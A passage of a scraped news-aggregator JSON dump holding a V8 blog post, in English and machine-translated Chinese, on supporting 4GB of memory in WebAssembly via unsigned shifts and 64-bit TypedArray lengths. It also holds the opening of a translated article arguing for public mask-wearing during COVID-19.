GB\u5185\u5b58\u7684\u957f\u5ea6\u5b9e\u9645\u4e0a\u4e0d\u9002\u540832\u4f4d\u6574\u6570\u3002\u4e3e\u4f8b\u8bf4\u660e\uff1a\u5728\u5341\u8fdb\u5236\u6570\u4e2d\uff0c\u6709100\u4e2a\u6570\u5b57\u6709\u4e24\u4f4d\u6570(0\u523099)\uff0c\u4f46\u662f&#34\uff1b100&#34\uff1b\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u4e09\u4f4d\u6570\u3002\u7c7b\u4f3c\u5730\uff0c4 GB\u53ef\u4ee5\u752832\u4f4d\u5730\u5740\u5bfb\u5740\uff0c\u4f464 GB\u672c\u8eab\u5c31\u662f33\u4f4d\u6570\u5b57\u3002\u6211\u4eec\u672c\u53ef\u4ee5\u6ee1\u8db3\u4e8e\u7a0d\u5fae\u4f4e\u4e00\u70b9\u7684\u9650\u5236\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u65e0\u8bba\u5982\u4f55\u90fd\u8981\u63a5\u89e6\u6240\u6709\u7684TypedArray\u4ee3\u7801\uff0c\u6240\u4ee5\u6211\u4eec\u60f3\u8ba9\u5b83\u4e3a\u5c06\u6765\u66f4\u5927\u7684\u9650\u5236\u505a\u597d\u51c6\u5907\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u66f4\u6539\u4e86\u6240\u6709\u5904\u7406TypedArray\u7d22\u5f15\u6216\u957f\u5ea6\u7684\u4ee3\u7801\uff0c\u4ee5\u4fbf\u5728\u9700\u8981\u4e0eJavaScript\u63a5\u53e3\u7684\u60c5\u51b5\u4e0b\u4f7f\u752864\u4f4d\u5bbd\u7684\u6574\u6570\u7c7b\u578b\u6216JavaScript\u6570\u5b57\u3002\u4f5c\u4e3a\u4e00\u4e2a\u989d\u5916\u7684\u597d\u5904\uff0c\u8fd9\u610f\u5473\u7740\u73b0\u5728\u652f\u6301wam64\u7684\u66f4\u5927\u5185\u5b58\u5e94\u8be5\u662f\u76f8\u5bf9\u7b80\u5355\u7684\uff01\u7b2c\u4e8c\u4e2a\u6311\u6218\u662f\u5904\u7406JavaScript\u5bf9Array\u5143\u7d20\u7684\u7279\u6b8a\u5927\u5c0f\u5199\uff0c\u800c\u4e0d\u662f\u5e38\u89c4\u547d\u540d\u5c5e\u6027\uff0c\u8fd9\u53cd\u6620\u5728\u6211\u4eec\u7684\u5bf9\u8c61\u5b9e\u73b0\u4e2d\u3002(\u8fd9\u662f\u4e00\u4e2a\u4e0eJavaScript\u89c4\u8303\u6709\u5173\u7684\u76f8\u5f53\u6280\u672f\u6027\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u5982\u679c\u60a8\u6ca1\u6709\u9075\u5faa\u6240\u6709\u7ec6\u8282\uff0c\u8bf7\u4e0d\u8981\u62c5\u5fc3\u3002)\u3002\u8003\u8651\u8fd9\u4e2a\u4f8b\u5b50\uff1a\u5982\u679carray\u662f\u4e00\u4e2a\u7eafJavaScript\u5bf9\u8c61\u6216Array\uff0c\u90a3\u4e48\u6570\u7ec4[5_000_000_000]\u5c06\u4f5c\u4e3a\u57fa\u4e8e\u5b57\u7b26\u4e32\u7684\u5c5e\u6027\u67e5\u627e\u6765\u5904\u7406\u3002\u8fd0\u884c\u5e93\u5c06\u67e5\u627e\u4ee5\u5b57\u7b26\u4e32\u547d\u540d\u7684\u5c5e\u6027\u201c5000000000\u201d\u3002\u5982\u679c\u627e\u4e0d\u5230\u8fd9\u6837\u7684\u5c5e\u6027\uff0c\u5b83\u5c06\u6cbf\u7740\u539f\u578b\u94fe\u5411\u4e0a\u904d\u5386\u5e76\u67e5\u627e\u8be5\u5c5e\u6027\uff0c\u6216\u8005\u6700\u7ec8\u5728\u94fe\u7684\u672b\u5c3e\u8fd4\u56deUNDEFINED\u3002\u4f46\u662f\uff0c\u5982\u679c\u6570\u7ec4\u672c\u8eab\u6216\u5176\u539f\u578b\u94fe\u4e0a\u7684\u5bf9\u8c61\u662fTypedArray\uff0c\u5219\u8fd0\u884c\u5e93\u5fc5\u987b\u5728\u7d22\u5f155,000,000,000\u5904\u67e5\u627e\u7d22\u5f15\u5143\u7d20\uff0c\u6216\u8005\u5982\u679c\u6b64\u7d22\u5f15\u8d85\u51fa\u754c\u9650\uff0c\u5219\u7acb\u5373\u8fd4\u56deUNDEFINED\u3002\u6362\u53e5\u8bdd\u8bf4\uff0cTypedArray\u7684\u89c4\u5219\u4e0e\u666e\u901a\u6570\u7ec4\u6709\u5f88\u5927\u7684\u4e0d\u540c\uff0c\u8fd9\u79cd\u5dee\u5f02\u4e3b\u8981\u8868\u73b0\u5728\u7d22\u5f15\u5f88\u5927\u7684\u60c5\u51b5\u4e0b\u3002\u56e0\u6b64\uff0c\u53ea\u8981\u6211\u4eec\u53ea\u5141\u8bb8\u8f83\u5c0f\u7684TypedArray\uff0c\u6211\u4eec\u7684\u5b9e\u73b0\u5c31\u53ef\u4ee5\u76f8\u5bf9\u7b80\u5355\uff1b\u7279\u522b\u662f\uff0c\u53ea\u9700\u67e5\u770b\u5c5e\u6027\u952e\u4e00\u6b21\u5c31\u8db3\u4ee5\u51b3\u5b9a\u662f\u5e94\u8be5\u91c7\u7528\u7d22\u5f15\u8def\u5f84\u8fd8\u662f\u540d\u79f0\u4e3a&#34\uff1b\u7684\u67e5\u627e\u8def\u5f84\u3002\u4e3a\u4e86\u5141\u8bb8\u66f4\u5927\u7684TypedArray\uff0c\u6211\u4eec\u73b0\u5728\u5fc5\u987b\u5728\u6cbf\u7740\u539f\u578b\u94fe\u5411\u4e0a\u79fb\u52a8\u65f6\u91cd\u590d\u8fdb\u884c\u8fd9\u79cd\u533a\u5206\uff0c\u8fd9\u9700\u8981\u4ed4\u7ec6\u7684\u7f13\u5b58\uff0c\u4ee5\u907f\u514d\u7531\u4e8e\u91cd\u590d\u5de5\u4f5c\u548c\u5f00\u9500\u800c\u964d\u4f4e\u73b0\u6709JavaScript\u4ee3\u7801\u7684\u901f\u5ea6\u3002\u5728\u5de5\u5177\u94fe\u7aef\uff0c\u6211\u4eec\u4e5f\u5fc5\u987b\u505a\u5de5\u4f5c\uff0c\u5927\u90e8\u5206\u5de5\u4f5c\u90fd\u5728JavaScript\u652f\u6301\u4ee3\u7801\u4e0a\uff0c\u800c\u4e0d\u662fWebAssembly\u4e2d\u7684\u7f16\u8bd1\u4ee3\u7801\u4e0a\u3002\u4e3b\u8981\u95ee\u9898\u662fEmscripten\u603b\u662f\u4ee5\u8fd9\u79cd\u5f62\u5f0f\u5199\u5165\u5185\u5b58\u8bbf\u95ee\uff1a\u5373\u4ece\u5730\u5740PTR+OFFSET\u8bfb\u53d632\u4f4d(4\u5b57\u8282)\u4f5c\u4e3a\u5e26\u7b26\u53f7\u6574\u6570\u3002\u5176\u5de5\u4f5c\u539f\u7406\u662fHEAP32\u662f\u4e00\u4e2aInt32Array\uff0c\u8fd9\u610f\u5473\u7740\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u7d22\u5f15\u90fd\u67094\u4e2a\u5b57\u8282\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5b57\u8282\u5730\u5740(PTR+OFFSET)\u9664\u4ee54\u6765\u5f97\u5230\u7d22\u5f15\uff0c\u8fd9\u5c31\u662f&gt\uff1b&gt\uff1b2\u6240\u505a\u7684\u3002\u95ee\u9898\u662f&gt\uff1b&gt\uff1b\u662f\u7b7e\u540d\u64cd\u4f5c\uff01\u5982\u679c\u5730\u5740\u57282 GB\u6216\u66f4\u9ad8\uff0c\u5219\u4f1a\u5c06\u8f93\u5165\u6ea2\u51fa\u4e3a\u8d1f\u6570\uff1a//\u7565\u4f4e\u4e8e2 GB\u5373\u53ef\uff0c\u8fd9\u5c06\u6253\u5370536870911\u63a7\u5236\u53f0\u3002\u65e5\u5fd7((2*1", "note_en": "Thanks to recent work in Chrome and Emscripten, you can now use up to 4GB of memory in WebAssembly applications. That\u2019s up from the previous limit of 2GB. It might seem odd that there was ever a limit - after all, no work was needed to allow people to use 512MB or 1GB of memory! - but it turns out that there are some special things happening in the jump from 2GB to 4GB, both in the browser and in the toolchain, which we\u2019ll describe in this post.  Some background before we get into more details: the new 4GB limit is the largest amount of memory possible with 32-bit pointers, which is what WebAssembly currently supports, known as \u201cwasm32\u201d in LLVM and elsewhere. There is work towards a \u201cwasm64\u201d ( \u201cmemory64\u201d in the wasm spec) in which pointers can be 64-bit and we would be able to make use of over 16 million terabytes of memory (!), but until then, 4GB is the most we can possibly hope to be able to access. It seems like we should always have been able to access 4GB, since that\u2019s what 32-bit pointers allow. Why then have we been limited to half that, just 2GB? There are multiple reasons, on both the browser and the toolchain side. Let\u2019s start with the browser.  In principle the changes in V8 sound simple: Just make sure that all code generated for WebAssembly functions, as well as all memory management code, uses unsigned 32-bit integers for memory indices and lengths, and we should be done. However, in practice, there&#39;s more to it than that! As WebAssembly memory can be exported to JavaScript as an ArrayBuffer, we also had to change the implementation of JavaScript ArrayBuffers, TypedArrays, and all Web APIs that use ArrayBuffers and TypedArrays, like Web Audio, WebGPU, and WebUSB. The first issue we had to solve was that V8 used  Smis (i.e. 31 bit signed integers) for TypedArray indices and lengths, so the maximum size was actually 2 30-1, or about 1GB. Additionally, it turns out that switching everything to 32-bit integers would not be enough, because the length of a 4GB memory actually does not fit into a 32-bit integer. To illustrate: in decimal, there are 100 numbers with two digits (0 through 99), but &#34;100&#34; itself is a three-digit number. Analogously, 4GB can be addressed with 32-bit addresses, but 4GB itself is a 33-bit number. We could have settled for a slightly lower limit, but as we had to touch all the TypedArray code anyway, we wanted to prepare it for even bigger future limits while we were at it. So we changed all code that deals with TypedArray indices or lengths to use 64-bit wide integer types, or JavaScript Numbers where interfacing with JavaScript is required. As an added benefit, this means that supporting even larger memories for wasm64 should be relatively straightforward now! A second challenge was dealing with JavaScript&#39;s special-casing for Array elements, compared to regular named properties, which is reflected in our implementation of objects. (This is a rather technical issue to do with the JavaScript spec, so don\u2019t worry if you don\u2019t follow all the details.) Consider this example:  If  array is a plain JavaScript object or Array, then  array[5_000_000_000] would be handled as a string-based property lookup. The runtime would look for a string-named property \u201c5000000000\u201d. If no such property can be found, it would walk up the prototype chain and look for that property, or eventually return  undefined at the end of the chain. However, if  array itself, or an object on its prototype chain, is a TypedArray, then the runtime must look for an indexed element at the index 5,000,000,000, or immediately return  undefined if this index is out of bounds. In other words, the rules for TypedArrays are quite different from normal Arrays, and the difference mostly manifests for huge indices. So as long as we only allowed smaller TypedArrays, our implementation could be relatively simple; in particular, looking at the property key just once was enough to decide whether the &#34;indexed&#34; or the &#34;named&#34; lookup path should be taken. To allow larger TypedArrays, we now have to make this distinction repeatedly as we walk up the prototype chain, which requires careful caching to avoid slowing down existing JavaScript code through repeated work and overhead.  On the toolchain side we had to do work as well, most of it on the JavaScript support code, not the compiled code in WebAssembly. The main issue was that Emscripten has always written memory accesses in this form:  That reads 32 bits (4 bytes) as a signed integer from address  ptr + offset. How this works is that  HEAP32 is an Int32Array, which means that each index in the array has 4 bytes. So we need to divide the byte address ( ptr + offset) by 4 to get the index, which is what the  &gt;&gt; 2 does. The problem is that  &gt;&gt; is a  signed operation! If the address is at the 2GB mark or higher, it will overflow the input into a negative number: // Just below 2GB is ok, this prints 536870911  console . log ( ( 2  *  1024  *  1024  *  1024  -  4 )  &gt;&gt;  2 ) ;   // 2GB overflows and we get -536870912 :(  console . log ( ( 2  *  1024  *  1024  *  1024 )  &gt;&gt;  2 ) ;\n The solution is to do an  unsigned shift,  &gt;&gt;&gt;: // This gives us 536870912, as we want!  console . log ( ( 2  *  1024  *  1024  *  1024 )  &gt;&gt;&gt;  2 ) ;\n Emscripten knows at compile time whether you may use 2GB or more memory (depending on the flags you use; see later for details). If your flags make 2GB+ addresses possible then the compiler will automatically rewrite all memory accesses to use  &gt;&gt;&gt; instead of  &gt;&gt;, which includes not just  HEAP32 etc. accesses as in the examples above but also operations like  .subarray() and  .copyWithin(). In other words, the compiler will switch to use unsigned pointers instead of signed ones. This transformation increases code size a little bit - one extra character in each shift - which is why we don\u2019t do it if you aren\u2019t using 2GB+ addresses. While the difference is typically less than 1%, it\u2019s just unnecessary, and easy to avoid - and lots of small optimizations add up! Other rare issues can arise in JavaScript support code. While normal memory accesses are handled automatically as described earlier, doing something like manually comparing a signed pointer to an unsigned one will (on address 2GB and above) return false. To find such issues we\u2019ve audited Emscripten\u2019s JavaScript and also run the test suite in a special mode where everything is placed at address 2GB or higher. (Note that if you write your own JavaScript support code you may have things to fix there as well, if you do manual things with pointers aside from normal memory accesses.)  To test this,  get the latest Emscripten release, or at least version 1.39.15. Then build with flags such as  Those enable memory growth, and allow the program to allocate all the way up to 4GB of memory. Note that by default you will only be able to allocate up to 2GB - you must explicitly opt in to using 2-4GB (this allows us to emit more compact code otherwise, by emitting  &gt;&gt; instead of  &gt;&gt;&gt; as mentioned above). Make sure to test on Chrome M83 (currently in Beta) or later. Please file issues if you find anything wrong!  Support for up to 4GB memory is another step in making the web as capable as native platforms, allowing 32-bit programs to be able to use just as much memory as they would normally. By itself this doesn\u2019t enable a completely new class of application, but it does enable higher-end experiences, such as a very large level in a game or manipulating large content in a graphical editor. As mentioned earlier, support for 64-bit memory is also planned, which will allow accessing even more than 4GB. However, wasm64 will have the same downside as 64-bit does on native platforms, that pointers take twice as much memory. That\u2019s why 4GB support in wasm32 is so important: We can access twice as much memory as before while code size remains as compact as wasm has always been! As always, test your code on multiple browsers, and also remember that 2-4GB is a lot of memory! If you need that much you should use it, but don\u2019t do so unnecessarily since there just won\u2019t be enough free memory on many users\u2019 machines. We recommend that you start with an initial memory that is as small as possible, and grow if necessary; and if you allow growth, gracefully handle the case of a  malloc() failure.", "posttime": "2020-05-15 01:38:44", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "webassembly,\u5185\u5b58,memory,javascript", "title": "WebAssembly\u4e2d\u6700\u9ad8\u53ef\u914d4 GB\u5185\u5b58", "title_en": "Up to 4GB of Memory in WebAssembly", "transed": 1, "url": "https://v8.dev/blog/4gb-wasm-memory", "via": "", "real_tags": ["\u5185\u5b58", "memory"]}, {"category": "", "categoryclass": "", "imagename": "dbf8291f999cb522f612860da4ee4b01.jpeg", "infoid": 1002118, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u662f\u65e7\u91d1\u5c71\u5927\u5b66\u7684\u4e00\u540d\u6570\u636e\u79d1\u5b66\u5bb6\uff0c\u5728\u7f51\u4e0a\u4e3aFast.ai\u6559\u6388\u673a\u5668\u5b66\u4e60\u65b9\u9762\u7684\u8bfe\u7a0b\u30023\u6708\u4e0b\u65ec\uff0c\u6211\u51b3\u5b9a\u7528\u516c\u5f00\u6234\u53e3\u7f69\u4f5c\u4e3a\u6848\u4f8b\u7814\u7a76\uff0c\u5411\u6211\u7684\u5b66\u751f\u5c55\u793a\u5982\u4f55\u7ed3\u5408\u548c\u5206\u6790\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u548c\u8bc1\u636e\u3002\n\u4ee4\u6211\u5403\u60ca\u7684\u662f\uff0c\u6211\u53d1\u73b0\u5728\u516c\u5171\u573a\u5408\u6234\u53e3\u7f69\u7684\u8bc1\u636e\u975e\u5e38\u5145\u5206\u3002\u770b\u6765\uff0c\u666e\u904d\u6234\u53e3\u7f69\u53ef\u80fd\u662f\u5e94\u5bf9\u51a0\u72b6\u75c5\u6bd2\u4f20\u64ad\u7684\u6700\u91cd\u8981\u5de5\u5177\u4e4b\u4e00\u3002\u7136\u800c\uff0c\u6211\u5468\u56f4\u7684\u4eba\u6ca1\u6709\u6234\u53e3\u7f69\uff0c\u7f8e\u56fd\u7684\u536b\u751f\u7ec4\u7ec7\u4e5f\u4e0d\u63a8\u8350\u4f7f\u7528\u53e3\u7f69\u3002\n\u6211\u548c\u5176\u4ed618\u4f4d\u6765\u81ea\u4e0d\u540c\u5b66\u79d1\u7684\u4e13\u5bb6\u4e00\u8d77\uff0c\u5bf9\u516c\u4f17\u4f69\u6234\u53e3\u7f69\u4f5c\u4e3a\u51cf\u7f13SARS-CoV-2\u4f20\u64ad\u7684\u5de5\u5177\u7684\u7814\u7a76\u8fdb\u884c\u4e86\u5ba1\u67e5\u3002\u6211\u4eec\u57284\u670812\u65e5\u53d1\u8868\u4e86\u6211\u4eec\u8bba\u6587\u7684\u9884\u5370\u672c\uff0c\u73b0\u5728\u6b63\u5728\u7b49\u5f85\u201c\u7f8e\u56fd\u56fd\u5bb6\u79d1\u5b66\u9662\u9662\u520a\u201d\u7684\u540c\u884c\u8bc4\u5ba1\u3002\n5\u670814\u65e5\uff0c\u6211\u548c100\u540d\u4e16\u754c\u9876\u5c16\u5b66\u8005\u5411\u6240\u6709\u7f8e\u56fd\u5dde\u957f\u53d1\u8868\u4e86\u4e00\u5c01\u516c\u5f00\u4fe1\uff0c\u8981\u6c42\u201c\u5b98\u5458\u4eec\u8981\u6c42\u5728\u6240\u6709\u516c\u5171\u573a\u6240\uff0c\u5982\u5546\u5e97\u3001\u4ea4\u901a\u7cfb\u7edf\u548c\u516c\u5171\u5efa\u7b51\uff0c\u90fd\u5fc5\u987b\u4f69\u6234\u53e3\u7f69\u3002\u201d\n\u76ee\u524d\uff0c\u7f8e\u56fd\u75be\u75c5\u63a7\u5236\u548c\u9884\u9632\u4e2d\u5fc3\u5efa\u8bae\u6bcf\u4e2a\u4eba\u90fd\u6234\u53e3\u7f69-\u8986\u76d6\u4e16\u754c90%\u4eba\u53e3\u7684\u653f\u5e9c\u4e5f\u662f\u5982\u6b64-\u4f46\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u7f8e\u56fd\u53ea\u670912\u4e2a\u5dde\u8981\u6c42\u6234\u53e3\u7f69\u3002\u5728\u5269\u4e0b\u7684\u5927\u591a\u6570\u5dde\uff0c\u75be\u63a7\u4e2d\u5fc3\u7684\u5efa\u8bae\u8fd8\u4e0d\u591f\uff1a\u5927\u591a\u6570\u4eba\u76ee\u524d\u6ca1\u6709\u6234\u53e3\u7f69\u3002\u7136\u800c\uff0c\u60c5\u51b5\u6b63\u5728\u8fc5\u901f\u53d8\u5316\u3002\u6bcf\u5468\u90fd\u6709\u8d8a\u6765\u8d8a\u591a\u7684\u53f8\u6cd5\u7ba1\u8f96\u533a\u8981\u6c42\u5728\u516c\u5171\u573a\u5408\u4f7f\u7528\u53e3\u7f69\u3002\u5728\u6211\u5199\u8fd9\u7bc7\u6587\u7ae0\u7684\u65f6\u5019\uff0c\u73b0\u5728\u5df2\u7ecf\u670994\u4e2a\u56fd\u5bb6\u91c7\u53d6\u4e86\u8fd9\u4e00\u4e3e\u63aa\u3002\n\u90a3\u4e48\uff0c\u662f\u4ec0\u4e48\u8bc1\u636e\u8ba9\u6211\u548c\u8fd9\u4e48\u591a\u79d1\u5b66\u5bb6\u5982\u6b64\u575a\u5b9a\u5730\u76f8\u4fe1\u53e3\u7f69\u5462\uff1f\n\u7b2c\u4e00\u6b21\u8ba9\u6211\u76f8\u4fe1\u7684\u7814\u7a76\u662f\u4e00\u9879\u6fc0\u5149\u6563\u5c04\u5b9e\u9a8c\u3002\u6765\u81ea\u7f8e\u56fd\u56fd\u7acb\u536b\u751f\u7814\u7a76\u9662\u7684\u7814\u7a76\u4eba\u5458\u4f7f\u7528\u6fc0\u5149\u7167\u660e\u5e76\u8ba1\u7b97\u4e00\u4e2a\u4eba\u5728\u6234\u548c\u4e0d\u6234\u53e3\u7f69\u7684\u60c5\u51b5\u4e0b\uff0c\u5411\u7a7a\u6c14\u4e2d\u629b\u51fa\u4e86\u591a\u5c11\u553e\u6db2\u6ef4\u3002\u8fd9\u7bc7\u8bba\u6587\u6700\u8fd1\u624d\u6b63\u5f0f\u53d1\u8868\uff0c\u4f46\u6211\u5728YouTube\u4e0a\u770b\u5230\u4e863\u6708\u521d\u7684\u4e00\u6bb5\u5b9e\u9a8c\u89c6\u9891\u3002\u7ed3\u679c\u5728\u89c6\u9891\u4e2d\u975e\u5e38\u660e\u663e\u3002\u5f53\u7814\u7a76\u4eba\u5458\u4f7f\u7528\u7b80\u5355\u7684\u5e03\u9762\u7f69\u65f6\uff0c\u51e0\u4e4e\u6240\u6709\u7684\u6db2\u6ef4\u90fd\u88ab\u963b\u6321\u4e86\u3002\n\u53ea\u6709\u5f53\u51a0\u72b6\u75c5\u6bd2\u901a\u8fc7\u4eba\u5634\u91cc\u7684\u98de\u6cab\u4f20\u64ad\u65f6\uff0c\u8fd9\u4e00\u8bc1\u636e\u624d\u662f\u76f8\u5173\u7684\u3002\u5b83\u662f\u3002\u6709\u8bb8\u591a\u8bb0\u5f55\u5728\u6848\u7684\u8d85\u7ea7\u4f20\u64ad\u6848\u4f8b\u4e0e\u6d3b\u52a8\u6709\u5173-\u6bd4\u5982\u5728\u5c01\u95ed\u7684\u7a7a\u95f4\u91cc\u5531\u6b4c-\u4ea7\u751f\u4e86\u5927\u91cf\u7684\u98de\u6cab\u3002\n\u5149\u6563\u5c04\u5b9e\u9a8c\u770b\u4e0d\u5230\u5c0f\u4e8e5\u5fae\u7c73\u7684\u201c\u5fae\u6ef4\u201d\uff0c\u53ef\u80fd\u542b\u6709\u4e00\u4e9b\u75c5\u6bd2\u9897\u7c92\u3002\u4f46\u4e13\u5bb6\u4eec\u8ba4\u4e3a\u8fd9\u4e9b\u5e76\u4e0d\u662f\u51a0\u72b6\u75c5\u6bd2\u4f20\u64ad\u7684\u4e3b\u8981\u539f\u56e0\u3002\n\u867d\u7136\u8fd9\u4e9b\u5c0f\u9897\u7c92\u5728\u4f20\u64ad\u8fc7\u7a0b\u4e2d\u5230\u5e95\u8d77\u5230\u4e86\u591a\u5927\u7684\u4f5c\u7528\u8fd8\u6709\u5f85\u89c2\u5bdf\uff0c\u4f46\u6700\u8fd1\u7684\u7814\u7a76\u8868\u660e\uff0c\u5e03\u53e3\u7f69\u5728\u51cf\u5c11\u8fd9\u4e9b\u5c0f\u9897\u7c92\u7684\u6269\u6563\u65b9\u9762\u4e5f\u662f\u6709\u6548\u7684\u3002\u5728\u4e00\u7bc7\u5c1a\u672a\u7ecf\u8fc7\u540c\u884c\u5ba1\u67e5\u7684\u8bba\u6587\u4e2d\uff0c\u7814\u7a76\u4eba\u5458\u53d1\u73b0\uff0c\u5fae\u6ef4\u4ece\u8ddd\u79bb\u6234\u53e3\u7f69\u7684\u4eba1.5\u7c73\u7684\u7a7a\u6c14\u4e2d\u5760\u843d\uff0c\u800c\u4e0d\u6234\u53e3\u7f69\u7684\u4eba\u53ea\u67095\u7c73\u3002\u5f53\u4e0e\u793e\u4f1a\u8ddd\u79bb\u76f8\u7ed3\u5408\u65f6\uff0c\u8fd9\u8868\u660e\u53e3\u7f69\u53ef\u4ee5\u6709\u6548\u5730\u51cf\u5c11\u901a\u8fc7\u5fae\u6ef4\u4f20\u64ad\u3002\n\u53e6\u4e00\u9879\u6700\u8fd1\u7684\u7814\u7a76\u8868\u660e\uff0c\u4e0d\u5408\u9002\u7684\u533b\u7528\u53e3\u7f69\u5728\u963b\u6b62\u547c\u5438\u8fc7\u7a0b\u4e2d\u55b7\u51fa\u7684\u98de\u6cab\u4e2d\u7684\u5b63\u8282\u6027\u51a0\u72b6\u75c5\u6bd2\u65b9\u9762\u662f100%\u6709\u6548\u7684\u3002\n\u5982\u679c\u53ea\u6709\u6709\u75c7\u72b6\u7684\u4eba\u611f\u67d3\u5176\u4ed6\u4eba\uff0c\u90a3\u4e48\u53ea\u6709\u6709\u75c7\u72b6\u7684\u4eba\u624d\u9700\u8981\u6234\u53e3\u7f69\u3002\u4f46\u4e13\u5bb6\u8868\u660e\uff0c\u6ca1\u6709\u75c7\u72b6\u7684\u4eba\u6709\u611f\u67d3\u4ed6\u4eba\u7684\u98ce\u9669\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6700\u8fd1\u7684\u56db\u9879\u7814\u7a76\u8868\u660e\uff0c\u8fd1\u4e00\u534a\u7684\u60a3\u8005\u662f\u7531\u672c\u8eab\u6ca1\u6709\u75c7\u72b6\u7684\u4eba\u611f\u67d3\u7684\u3002\n\u5728\u6211\u770b\u6765\uff0c\u8fd9\u4e00\u8bc1\u636e\u4f3c\u4e4e\u7b80\u5355\u660e\u4e86\uff1a\u51a0\u72b6\u75c5\u6bd2\u662f\u901a\u8fc7\u98de\u6cab\u4f20\u64ad\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u770b\u5230\uff0c\u4e00\u5757\u5e03\u53ef\u4ee5\u963b\u6321\u8fd9\u4e9b\u6db2\u6ef4\u548c\u8fd9\u4e9b\u6db2\u6ef4\u5305\u542b\u7684\u75c5\u6bd2\u3002\u6ca1\u6709\u75c7\u72b6\u7684\u4eba\u751a\u81f3\u4e0d\u77e5\u9053\u81ea\u5df1\u751f\u75c5\u4e86\uff0c\u4ed6\u4eec\u8981\u4e3a\u5927\u7ea6\u4e00\u534a\u7684\u75c5\u6bd2\u4f20\u64ad\u8d1f\u8d23\u3002\n\u57283\u6708\u5e95\u548c4\u6708\u521d\u770b\u5b8c\u6240\u6709\u8fd9\u4e9b\u5f3a\u6709\u529b\u7684\u8bc1\u636e\u540e\uff0c\u6211\u60f3\u77e5\u9053\u4e3a\u4ec0\u4e48\u6234\u53e3\u7f69\u5728\u897f\u65b9\u4e16\u754c\u7684\u536b\u751f\u7ec4\u7ec7\u4e2d\u6709\u4e89\u8bae\u3002\u7f8e\u56fd\u548c\u6b27\u6d32\u75be\u63a7\u4e2d\u5fc3\u4e0d\u63a8\u8350\u53e3\u7f69\uff0c\u9664\u4e86\u65af\u6d1b\u4f10\u514b\u548c\u6377\u514b\u4e4b\u5916\uff0c\u51e0\u4e4e\u4efb\u4f55\u897f\u65b9\u653f\u5e9c\u90fd\u4e0d\u63a8\u8350\u53e3\u7f69\uff0c\u8fd9\u4e24\u4e2a\u56fd\u5bb6\u57283\u6708\u4e0b\u65ec\u90fd\u8981\u6c42\u6234\u53e3\u7f69\u3002\n\u7b2c\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u5927\u591a\u6570\u7814\u7a76\u4eba\u5458\u90fd\u5728\u7814\u7a76\u9519\u8bef\u7684\u95ee\u9898-\u53e3\u7f69\u5bf9\u4f69\u6234\u8005\u7684\u4fdd\u62a4\u4f5c\u7528\u5982\u4f55\uff0c\u800c\u4e0d\u662f\u53e3\u7f69\u5bf9\u611f\u67d3\u8005\u4f20\u64ad\u75c5\u6bd2\u7684\u9884\u9632\u4f5c\u7528\u6709\u591a\u597d\u3002\u53e3\u7f69\u7684\u529f\u80fd\u4e0e\u4e2a\u4eba\u9632\u62a4\u88c5\u5907(PPE)\u548c\u6e90\u5934\u63a7\u5236\u622a\u7136\u4e0d\u540c\u3002\n\u53e3\u7f69\u5728\u963b\u6321\u8f83\u5927\u7684\u6db2\u6ef4\u65b9\u9762\u975e\u5e38\u51fa\u8272\uff0c\u4f46\u5728\u963b\u6321\u5fae\u5c0f\u9897\u7c92\u65b9\u9762\u5219\u5dee\u5f97\u5f88\u8fdc\u3002\u5f53\u4e00\u4e2a\u4eba\u628a\u6db2\u6ef4\u6392\u5165\u7a7a\u6c14\u4e2d\u65f6\uff0c\u5b83\u4eec\u4f1a\u8fc5\u901f\u84b8\u53d1\u548c\u6536\u7f29\uff0c\u6210\u4e3a\u7a7a\u6c14\u4e2d\u7684\u5fae\u5c0f\u9897\u7c92\uff0c\u79f0\u4e3a\u6db2\u6ef4\u6838\u3002\u8fd9\u4e9b\u4e1c\u897f\u5f88\u96be\u4ece\u7a7a\u6c14\u4e2d\u53bb\u9664\u3002\u7136\u800c\uff0c\u5728\u4eba\u7684\u5634\u5df4\u548c\u53e3\u7f69\u4e4b\u95f4\u6f6e\u6e7f\u7684\u5927\u6c14\u4e2d\uff0c\u6db2\u6ef4\u84b8\u53d1\u5e76\u6536\u7f29\u6210\u6db2\u6ef4\u6838\u6240\u9700\u7684\u65f6\u95f4\u51e0\u4e4e\u662f\u524d\u8005\u7684100\u500d\u3002\n\u8fd9\u610f\u5473\u7740\u51e0\u4e4e\u4efb\u4f55\u4e00\u79cd\u7b80\u5355\u7684\u5e03\u6599\u906e\u7f69\u90fd\u53ef\u4ee5\u5f88\u597d\u5730\u8fdb\u884c\u6e90\u4ee3\u7801\u63a7\u5236\u3002\u53e3\u7f69\u4ea7\u751f\u6e7f\u5ea6\uff0c\u8fd9\u79cd\u6e7f\u5ea6\u963b\u6b62\u542b\u6709\u75c5\u6bd2\u7684\u6db2\u6ef4\u53d8\u6210\u6db2\u6ef4\u6838\uff0c\u8fd9\u4f7f\u5f97\u53e3\u7f69\u7684\u7ec7\u7269\u53ef\u4ee5\u963b\u6321\u6db2\u6ef4\u3002\n\u4e0d\u5e78\u7684\u662f\uff0c\u5728\u8fd9\u573a\u5927\u6d41\u884c\u5f00\u59cb\u65f6\uff0c\u51e0\u4e4e\u6240\u6709\u53ef\u7528\u7684\u7814\u7a76\u90fd\u96c6\u4e2d\u5728\u4f5c\u4e3a\u4e2a\u4eba\u9632\u62a4\u7528\u54c1\u7684\u53e3\u7f69\u529f\u6548\u4e0a\u3002\u8fd9\u4e00\u63aa\u65bd\u5bf9\u4e8e\u4fdd\u62a4\u536b\u751f\u4fdd\u5065\u5de5\u4f5c\u8005\u975e\u5e38\u91cd\u8981\uff0c\u4f46\u5e76\u4e0d\u80fd\u4f53\u73b0\u4ed6\u4eec\u4f5c\u4e3a\u6e90\u5934\u63a7\u5236\u7684\u4ef7\u503c\u30022\u670829\u65e5\uff0c\u7f8e\u56fd\u536b\u751f\u5c40\u5c40\u957f\u5728\u63a8\u7279\u4e0a\u8868\u